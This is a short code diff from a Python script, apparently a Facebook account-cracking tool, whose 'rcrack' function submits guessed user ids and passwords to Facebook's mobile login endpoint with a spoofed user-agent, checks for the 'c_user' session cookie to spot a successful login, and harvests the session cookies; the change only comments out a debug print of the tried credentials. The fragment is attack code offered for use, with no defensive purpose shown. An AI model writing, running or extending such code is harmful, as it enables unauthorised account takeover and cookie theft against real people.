@@ -279,7 +279,7 @@ def rcrack(uid,pwx,tl):
 			'user-agent': pro,}
 			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
-			print(iid+'|'+pws+'|'+str(log_cookies))
+			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
